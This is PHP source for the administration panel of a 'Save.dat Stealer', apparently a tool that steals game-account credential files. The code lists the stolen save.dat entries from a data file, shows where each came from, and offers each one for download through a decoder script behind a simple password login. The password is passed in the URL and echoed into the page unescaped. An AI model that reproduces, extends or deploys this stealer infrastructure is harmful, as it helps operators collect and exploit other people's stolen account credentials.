<?php
function outputAdministrationData()
{
?>
<html>
<head>
<title>Save.dat Stealer Administration</title>
</head>
<body>
<center><h1>Save.dat Stealer Administration</h1></center><br><br>
<?php
$handle = fopen("data/saveDats.txt", "r");
if ($handle) {
    while (($line = fgets($handle)) !== false) {
	$line = trim(preg_replace('/\s\s+/', '', $line));
	$savedatProp = explode(";", file_get_contents("data/" . $line));
        echo($savedatProp[1] . " from " . $savedatProp[2] . '   <form action="savedat_decoder.php"><input 

type="hidden" name="password" value="' . $_GET["password"] . '"><input type="hidden"  name="dataToDecode" 

value="' . $savedatProp[0] . '"><input type="submit" value="Download save.dat!"></form><br>');
    }
    fclose($handle);
} else {
    echo "Error while looking for save.dats";
}
?>
</body>
</html>
<?php
}

if(isset($_GET["password"]))
{
	if(strcmp($_GET["password"], file_get_contents("data/password.txt"))==0)
	{
		outputAdministrationData();
	} else {
		echo "Invalid password!";
	}
} else {
?>

<html>
<head>
<title>Save.dat Stealer Administration</title>
</head>
<body>
<center><h1>Save.dat Stealer Administration</h1></center><br>
<b>Please Login:</b><br>
<form>
	Password:<br>
	<input type="password" name="password" value=""><br>
	<input type="submit" value="Login!">
</form>
</html>

<?php
}
?>
